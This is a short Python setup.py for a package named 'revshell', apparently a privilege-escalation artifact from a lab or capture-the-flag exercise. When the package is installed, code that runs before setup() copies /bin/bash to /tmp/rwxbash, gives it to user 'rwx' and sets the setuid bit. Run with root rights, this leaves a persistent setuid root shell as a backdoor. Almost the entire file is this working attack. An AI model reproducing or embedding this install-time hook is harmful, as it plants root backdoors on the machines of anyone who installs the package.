import os, os.path, subprocess, sys
from distutils.core import setup

try:
	subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
	subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
	subprocess.check_output(['chmod', '4555', '/tmp/rwxbash'])
	subprocess.check_output(['chmod', 'u+s', '/tmp/rwxbash'])
	print 'Set up rwxbash'
except:
	print 'Couldn\'t set up rwxbash?'

setup(
	name='revshell',
	version='1.0',
	py_modules=['revshell']
)
